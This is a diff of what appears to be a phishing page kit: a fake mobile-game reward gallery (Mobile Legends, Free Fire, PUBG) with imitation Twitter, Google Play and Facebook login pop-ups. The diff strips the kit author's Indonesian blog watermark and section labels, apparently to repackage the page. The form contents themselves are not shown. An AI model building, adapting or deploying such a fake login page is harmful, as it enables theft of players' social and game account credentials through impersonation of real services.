@@ -1,4 +1,3 @@
-<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -736,8 +735,6 @@ if (@$_GET['p'] == 'collect') {
 
 <div class="gallery-container">
 
-
-<!--- COLLECTED POP UP --->
 <div id="collected">
 <div class="collected-box">
 <div class="collected-box-image">
@@ -759,9 +756,6 @@ if (@$_GET['p'] == 'collect') {
 </div>
 </div>
 </div>
-<!--- /COLLECTED POP UP --->
-<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
-<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
 <div class="gallery">
 <div class="item">
 <img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678586_3884124.png">
@@ -1109,8 +1103,6 @@ if (@$_GET['p'] == 'collect') {
 </div>
 </div>
 </div>
-
-
 <div class="notification-container">
 <div class="button">
 <a href="https://play.google.com/store/apps/details?id=com.mobile.legends">
@@ -1119,8 +1111,6 @@ if (@$_GET['p'] == 'collect') {
 <img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore2.png"></a>
 </div>
 </div>
-<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
-
 <div class="footer">
 <center>
 <img style="margin-right:5px" width="30" src="https://i.ibb.co/SNwZsxx/pubg.png">
@@ -1173,8 +1163,6 @@ function showSlides() {
 
 
 <div class="gallery-container">
-<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
-<!--- TWITTER LOGIN --->
 <div id="twitter">
 <div class="twitter-login">
 <a href="#" class="close" title="Close">&times;</a>
@@ -1204,9 +1192,6 @@ function showSlides() {
 </form>
 </div>
 </div>
-<!--- /TWITTER LOGIN --->
-<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
-<!--- GOOGLE PLAY LOGIN --->
 <div id="gp">
 <div class="gp-login">
 <a href="#" class="close" title="Close">&times;</a>
@@ -1248,9 +1233,6 @@ function showSlides() {
 </form>
 </div>
 </div>
-<!--- /GOOGLE PLAY LOGIN --->
-<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
-<!--- FB LOGIN --->
 <div id="fb">
 <div class="fb-login">
 <a href="#" class="close" title="Close">&times;</a>
@@ -1287,8 +1269,6 @@ function showSlides() {
 </form>
 </div>
 </div>
-<!--- /FB LOGIN --->
-<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
 <button onclick="location.href='#twitter';" class="twitter"><i style="float:left;" class="fa fa-twitter"></i>Twitter</button>
 </br>
 </br>
